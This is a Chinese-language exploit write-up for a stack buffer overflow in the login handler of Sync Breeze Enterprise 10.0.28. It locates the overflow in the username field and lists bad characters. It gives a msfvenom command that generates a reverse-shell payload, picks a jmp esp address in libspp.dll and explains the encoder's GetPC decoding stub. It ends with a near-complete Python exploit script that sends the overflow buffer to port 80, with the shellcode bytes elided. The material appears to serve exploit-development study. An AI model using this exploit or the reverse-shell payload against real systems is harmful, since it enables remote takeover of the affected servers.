---
layout: default
---

# Sync Breeze Enterprise 10.0.28 栈溢出漏洞分析
## 1.确定溢出位置


> syncbrs.exe 使用http post进行登录请求时未判断username长度进行字符串拷贝操作,从而导致栈溢出.

>  1.1: 分配了30CH的栈空间用于存储数据，然后使用EAX将栈空间地址传递给解析函数.

![在这里插入图片描述](./Sync_Breeze_Enterprise_10.0.28_Remote_Buffer_Overflow_res/46203376cde14417b64e965ff0f9adce.jpeg#pic_center)

>  1.2： 调用libpal.dll中的GetField解析参数取出username并复制到指定栈地址空间上.(**此处产生溢出**)

![在这里插入图片描述](./Sync_Breeze_Enterprise_10.0.28_Remote_Buffer_Overflow_res/bc8f65b6f09e43f29c436e4cc109e981.jpeg#pic_center)
 ## 2. 生成shellcode
 

	大概流程如下:
```
2.1 根据上面分析其实己经得知分配的栈空间=30CH. (shellcode前填充字节数己确定)
2.2 确定一下bad characters: \x00\x0a\x0d\x25\x26\x2b\x3d
2.3 使用msfvenom 生成shellcode:
-----------------------------------
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```


## 3. 查找一个jmp esp地址

> 大概流程如下:

```
3.1 找到所有载入模块
3.2 遍历每一个模块IMAGE_OPTIONAL_HEADER中DllCharacteristics不能使用ASLR
3.3 查找是否包含jmp esp的opcode: FFE4
3.4 找到的地址是否包含bad characters,如果包含则不能使用
----------------------------------
libspp.dll 0x10090c83地址符合所有条件.
```
## 4.注入

> <font color=red>注意:</font> 
>	生成shellcode为了不使用bad characters而使用了编码,那自然需要解码.
>而解码代码需要知道需要解码的代码所在地址,这里需要使用到GetPC.
>
解码代码如下:
```nasm
mov 	edi,46BD1770h
fcmovu 	st,st(6)		
fnstenv	[esp-0Ch]		;保存fpu环境
pop 	esi				;得到fcmovu这条指令执行的地址
sub 	ecx,ecx
mov 	cl,52h
xor 	dword ptr [esi+12h],edi
sub		esi,0FFFFFFFCh
....
```
> fnstenv指令会将以下的结构体数据保存在堆栈上: 
> 其中FIP保存了上一条FPU指令的地址,本例中为:fcmovu
> ![在这里插入图片描述](./Sync_Breeze_Enterprise_10.0.28_Remote_Buffer_Overflow_res/6b2d00fc049c478e8cbf1f785c236789.jpeg#pic_center)

> 既然fnstenv会使用栈空间,那么可能会对注入的shellcode产生影响.
> 所以这里需要对内存进行一些处理,这里使用nop.![在这里插入图片描述](./Sync_Breeze_Enterprise_10.0.28_Remote_Buffer_Overflow_res/a231719354df475dac26345dfb3b7eec.jpeg#pic_center)
> 
> <font color=red>栈空间加了12个nop来处理,虽然01aa7468地址处的数据还是被覆盖了,但是这里的代码己经执行过了,所以不会有影响</font>

## 5.总结

```
主要是注意一下生成的shellcode使用的GetPC是哪种方式,注意栈空间是否会被破坏. 
```

## 注入代码参考

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" #0x10090c83  
  offset = b"C" * 4
  nops = b"\x90" * 12
  shellcode = b"........................."

  shellcode+= b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode))
  inputBuffer = filler + eip + offset + nops + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")

```
